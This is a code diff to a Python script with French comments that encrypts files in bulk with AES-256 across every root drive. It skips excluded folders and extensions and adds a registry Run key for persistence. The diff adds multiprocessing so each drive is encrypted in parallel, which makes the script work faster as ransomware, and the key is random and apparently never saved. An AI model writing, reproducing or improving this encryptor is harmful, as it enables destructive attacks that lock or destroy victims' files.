@@ -1,11 +1,12 @@
 import os
 import string
-import winreg
 from pathlib import Path
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
-import subprocess
+from pathlib import Path
+import multiprocessing
+import winreg
 
 # Clé et IV pour AES-256 CBC
 key = os.urandom(32)  # 256 bits
@@ -116,13 +117,67 @@ def search_file(base_path):
             print(f"[!] Erreur sur {file}: {e}")
     return True
 
+# --- Ajout pour multi-processing sur un même lecteur ---
+
+def diviser_liste(lst, n):
+    # Si la liste est vide, on retourne n listes vides
+    if len(lst) == 0:
+        return [[] for _ in range(n)]
+    longueur = len(lst)
+
+    # Taille de chaque sous-liste (arrondi vers le haut pour ne rien perdre)
+    taille = (longueur + n - 1) // n
+
+    result = []
+
+    for i in range(n):
+        debut = i * taille
+        fin = debut + taille
+        # On ajoute la tranche correspondante à la sous-liste
+        result.append(lst[debut:fin])
+
+    return result
+
+
+def chiffrer_liste_fichiers(fichiers):
+    for file in fichiers:
+        try:
+            if is_in_excluded_folder(file):
+                continue
+            if file.is_file() and file.suffix.lower() not in extensions_exclues and file.stat().st_size < max_size:
+                encrypte_file(str(file))
+        except Exception as e:
+            print(f"[!] Erreur sur {file}: {e}")
+
+
+def process_par_lecteur(chemin, nb_process=5):
+    chemin = Path(chemin)
+    fichiers = list(chemin.rglob("*"))
+    sous_listes = diviser_liste(fichiers, nb_process)
+
+    processus = []
+    for sous_liste in sous_listes:
+        p = multiprocessing.Process(target=chiffrer_liste_fichiers, args=(sous_liste,))
+        p.start()
+        processus.append(p)
+
+    for p in processus:
+        p.join()
 
 def main():
     ajouter_run_key()
-    paths = get_existing_root_path()
-    for path in paths:
-        search_file(path)
+    lecteurs = get_existing_root_path()
+    processus_lecteurs = []
+
+    for lecteur in lecteurs:
+        p = multiprocessing.Process(target=process_par_lecteur, args=(lecteur,))
+        p.start()
+        processus_lecteurs.append(p)
+
+    for p in processus_lecteurs:
+        p.join()
 
 
 if __name__ == "__main__":
+    multiprocessing.freeze_support()
     main()
